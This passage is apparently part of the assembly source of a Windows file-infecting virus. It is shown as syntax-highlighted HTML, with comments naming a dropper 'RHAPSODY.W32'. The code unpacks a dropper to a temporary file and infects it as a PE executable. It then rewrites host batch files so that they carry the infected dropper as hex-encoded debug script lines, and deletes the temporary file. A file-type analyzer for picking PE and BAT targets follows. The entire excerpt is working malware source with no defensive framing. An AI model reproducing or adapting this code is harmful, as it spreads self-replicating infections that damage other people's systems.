        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc0">
</span><span class="sc5">sdr0p</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dr0p</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">over_dr0p</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">sdr0p</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">; LSCE_UnPack</span><span class="sc0">
</span><span class="sc5">unpack_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">; 1 byte</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; 2 bytes</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">store_byte</span><span class="sc0">                      </span><span class="sc1">; 2 bytes</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; 1 byte</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; 1 byte</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">; 2 bytes</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                                    </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; 2 bytes</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; 2 bytes</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                          </span><span class="sc1">; 1 byte</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">store_byte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; 1 byte</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">unpack_loop</span><span class="sc0">                     </span><span class="sc1">; 2 bytes</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                             </span><span class="sc1">; Create the dropper on</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">                             </span><span class="sc1">; a temporal file called</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">02h</span><span class="sc0">                             </span><span class="sc1">; RHAPSODY.W32 (that will be</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                             </span><span class="sc1">; erased later)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000000h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">temp_file</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Write it, sucka!</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">iobytes</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">GlobalAllocHandle3</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteFile</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">GlobalAllocHandle3</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GlobalFree</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">temp_file</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">                 </span><span class="sc1">; Infect dr0pped file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectPE</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                             </span><span class="sc1">; Open the infected dr0pper</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">                             </span><span class="sc1">; (again) but now for R/W</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0C0000000h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">temp_file</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FileHandle3</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileSize</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">InfDropperSize</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">; EBX = infected dr0pper size</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GlobalAlloc</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">                   </span><span class="sc1">; Another allocation</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">GlobalAllocHandle3</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                             </span><span class="sc1">; Write there the infected</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumOfBytesWritten</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">         </span><span class="sc1">; dropper code</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">FileHandle3</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadFile</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">FileHandle3</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

</span><span class="sc1">; BAT infection, part 3</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">MapAddress2</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">               </span><span class="sc1">; EDI = Ptr to infected BAT</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">bat_inf1</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">                  </span><span class="sc1">; Write first part of the</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">n_bat_inf1</span><span class="sc0">                      </span><span class="sc1">; new BAT</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">GlobalAllocHandle3</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">        </span><span class="sc1">; ESI = Ptr to infected dr0pper</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">InfDropperSize</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                         </span><span class="sc1">; divide per 10</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                         </span><span class="sc1">; x/10*10 ... for round up :)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; in EAX</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">src_bytes</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">                 </span><span class="sc1">; EDI ptr to bytes to write</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HexWrite16</span><span class="sc0">                      </span><span class="sc1">; Convert&amp;Write!</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; Starting with 100h ;)</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">

</span><span class="sc5">sixteen_bytes_written_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">" E"</span><span class="sc0">                         </span><span class="sc1">; Write E</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; E xxxx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HexWrite16</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">write_row</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">" "</span><span class="sc0">                          </span><span class="sc1">; Write space</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HexWrite8</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">write_row</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A0Dh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">sixteen_bytes_written_loop</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">GlobalAllocHandle3</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GlobalFree</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">                    </span><span class="sc1">; Free some mem</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">bat_inf2</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">                  </span><span class="sc1">; Write second BAT part</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">n_bat_inf2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">GlobalAllocHandle</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">         </span><span class="sc1">; Let's write the old bat code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Size2I</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">MapAddress2</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">MapAddress2</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapViewOfFile</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">MapHandle2</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">FileHandle2</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFilePointer</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">FileHandle2</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetEndOfFile</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">GlobalAllocHandle</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GlobalFree</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CloseAndExitInfectBAT</span><span class="sc0">

</span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectBAT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">MapAddress2</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapViewOfFile</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectBAT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">MapHandle2</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

</span><span class="sc5">CloseAndExitInfectBAT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">FileHandle2</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
</span><span class="sc5">ExitInfectBAT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">temp_file</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteFileA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">
</span><span class="sc1">; [ Miscellaneous routines                                                  ]</span><span class="sc0">
</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EDI - Where store converted number</span><span class="sc0">
</span><span class="sc1">;       EAX - Number to convert</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">


</span><span class="sc5">HexWrite16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HexWrite8</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">HexWrite8</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; Mmm... routines stolen from</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                          </span><span class="sc1">; borland...cut'n'paste rocks!</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">; ;)</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3030h</span><span class="sc0">                        </span><span class="sc1">; Blargh, they are shitty </span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                           </span><span class="sc1">; optimized, even locally. I</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc0">                          </span><span class="sc1">; Fixed a bit that local opt.</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">@@4</span><span class="sc0">                             </span><span class="sc1">; but it's still unoptimized</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc0">                          </span><span class="sc1">; structurally... AAAGH! :)</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">@@3</span><span class="sc0">
</span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@@3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,(</span><span class="sc3">"A"</span><span class="sc4">-</span><span class="sc2">10</span><span class="sc4">)-</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@2</span><span class="sc0">
</span><span class="sc5">@@4</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc3">"A"</span><span class="sc4">-</span><span class="sc2">10</span><span class="sc4">)-</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@1</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EDI - File name to analyze</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       ECX - 00 -&gt; Unknown file</span><span class="sc0">
</span><span class="sc1">;             01 -&gt; PE file</span><span class="sc0">
</span><span class="sc1">;             02 -&gt; BAT file</span><span class="sc0">

</span><span class="sc5">AnalyzeFileName</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">
